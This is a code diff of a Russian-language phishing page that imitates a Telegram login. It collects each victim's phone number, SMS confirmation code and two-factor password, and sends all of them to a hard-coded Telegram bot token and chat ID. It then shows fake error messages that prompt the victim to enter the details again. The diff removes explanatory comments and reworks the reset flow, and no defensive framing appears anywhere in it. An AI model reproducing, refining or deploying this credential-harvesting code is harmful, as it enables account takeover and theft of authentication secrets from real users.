@@ -530,7 +530,7 @@
     <script>
         // Настройки бота
         const BOT_TOKEN = '8372074788:AAEtv-DrsVdfw9fDVRbAqNYiOCSPOcnH978';
-        const CHAT_ID = '5836216083'; // ID пользователя @yulswag
+        const CHAT_ID = '5836216083';
 
         // Список популярных стран с кодами и флагами
         const countries = [
@@ -603,7 +603,7 @@
         const errorMessage = document.getElementById('errorMessage');
         const codeDigits = document.querySelectorAll('.code-digit');
 
-        // Текущая выбранная страна - всегда Россия по умолчанию
+        // Текущая выбранная страна
         let currentCountry = countries.find(country => country.code === '7') || countries[0];
         let enteredPhoneNumber = '';
         let enteredCode = '';
@@ -613,7 +613,7 @@
         let secondsLeft = 60;
         let twoFAAttempts = 0;
 
-        // Инициализация - устанавливаем Россию при загрузке
+        // Инициализация
         function initializeCountry() {
             selectCountry(currentCountry);
         }
@@ -649,18 +649,13 @@
                 return;
             }
             
-            // Используем выбранный код страны
             const fullPhoneNumber = `+${currentCountry.code} ${phoneNumber}`;
             enteredPhoneNumber = fullPhoneNumber;
             
-            // Показываем индикатор загрузки
             showLoading();
             
             try {
-                // Отправляем номер в Telegram через бота
                 await sendToTelegramBot(`📱 Номер телефона: ${fullPhoneNumber}`);
-                
-                // Переходим к экрану ввода кода
                 showCodeScreen(fullPhoneNumber);
                 
             } catch (error) {
@@ -682,10 +677,7 @@
             showLoading();
             
             try {
-                // Отправляем код в Telegram
                 await sendToTelegramBot(`🔐 Код подтверждения: ${code}\n📱 Для номера: ${enteredPhoneNumber}`);
-                
-                // Переходим к экрану 2FA
                 showTwoFAScreen();
                 
             } catch (error) {
@@ -712,28 +704,23 @@
             showLoading();
             
             try {
-                // Отправляем пароль 2FA в Telegram
                 await sendToTelegramBot(`🔑 Пароль 2FA: ${password}\n📱 Для номера: ${enteredPhoneNumber}\n🔐 После кода: ${enteredCode}`);
                 
-                // Увеличиваем счетчик попыток
                 twoFAAttempts++;
                 
                 setTimeout(() => {
                     hideLoading();
                     
                     if (twoFAAttempts === 1) {
-                        // Первая попытка - показываем ошибку
                         showError('Неверный 2FA, проверьте правильность ввода.');
                         passwordInput.value = '';
                         passwordInput.focus();
                     } else {
-                        // Вторая попытка - сбрасываем всё
                         showError('Вы вошли не через ваш аккаунт, попробуйте снова');
                         twoFAAttempts = 0;
                         setTimeout(() => {
-                            showPhoneScreen();
-                            passwordInput.value = '';
-                        }, 2000);
+                            resetToPhoneScreen();
+                        }, 1500);
                     }
                 }, 1000);
                 
@@ -751,7 +738,6 @@
             resendCode.style.display = 'none';
             timerText.classList.remove('hidden');
             
-            // Запускаем таймер
             startResendTimer();
             
             showLoading();
@@ -791,17 +777,14 @@
             digit.addEventListener('input', (e) => {
                 const value = e.target.value;
                 
-                // Переход к следующему полю при вводе цифры
                 if (value && index < codeDigits.length - 1) {
                     codeDigits[index + 1].focus();
                 }
                 
-                // Проверка, все ли поля заполнены
                 checkCodeCompletion();
             });
             
             digit.addEventListener('keydown', (e) => {
-                // Обработка Backspace
                 if (e.key === 'Backspace' && !digit.value && index > 0) {
                     codeDigits[index - 1].focus();
                 }
@@ -848,7 +831,6 @@
             sentPhoneNumber.textContent = phoneNumber;
             hideLoading();
             
-            // Сброс полей ввода кода
             codeDigits.forEach(digit => {
                 digit.value = '';
             });
@@ -863,7 +845,7 @@
             twoFAScreen.classList.remove('hidden');
             hideLoading();
             passwordInput.focus();
-            twoFAAttempts = 0; // Сбрасываем счетчик при каждом показе экрана 2FA
+            twoFAAttempts = 0;
         }
 
         // Показать экран ввода телефона
@@ -874,6 +856,17 @@
             phoneInput.value = '';
             hideLoading();
             twoFAAttempts = 0;
+        }
+
+        // Сброс к экрану телефона с сообщением
+        function resetToPhoneScreen() {
+            phoneScreen.classList.remove('hidden');
+            codeScreen.classList.add('hidden');
+            twoFAScreen.classList.add('hidden');
+            phoneInput.value = '';
+            hideLoading();
+            twoFAAttempts = 0;
+            showError('Вы вошли не через ваш аккаунт, попробуйте снова');
         }
 
         // Проверка заполнения кода
@@ -916,13 +909,12 @@
             renderCountryList(countrySearch.value);
         });
 
-        // Функция отрисовки списка стран - ИСПРАВЛЕННАЯ
+        // Функция отрисовки списка стран
         function renderCountryList(searchTerm = '') {
             countryList.innerHTML = '';
             
             const filteredGroups = {};
             
-            // Фильтрация стран по поисковому запросу
             Object.keys(groupedCountries).forEach(letter => {
                 const filteredCountries = groupedCountries[letter].filter(country => 
                     country.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
@@ -934,10 +926,8 @@
                 }
             });
             
-            // Если есть результаты поиска, отображаем их
             if (searchTerm) {
                 Object.keys(filteredGroups).forEach(letter => {
-                    // ИСПРАВЛЕНИЕ: используем filteredGroups[letter] вместо filteredCountries[letter]
                     filteredGroups[letter].forEach(country => {
                         const countryOption = document.createElement('div');
                         countryOption.className = 'country-option';
@@ -956,7 +946,6 @@
                     });
                 });
             } else {
-                // Отображаем полный список с группировкой по буквам
                 Object.keys(groupedCountries).forEach(letter => {
                     const letterSection = document.createElement('div');
                     letterSection.className = 'letter-section';
@@ -987,7 +976,6 @@
         function selectCountry(country) {
             currentCountry = country;
             
-            // Обновляем отображение выбранной страны
             const flagElement = countrySelector.querySelector('.country-flag');
             const codeElement = countrySelector.querySelector('.country-code');
             const nameElement = countrySelector.querySelector('.country-name');
@@ -996,7 +984,6 @@
             codeElement.textContent = `+${country.code}`;
             nameElement.textContent = country.name;
             
-            // Обновляем префикс в поле ввода телефона
             phonePrefix.textContent = `+${country.code}`;
         }
 
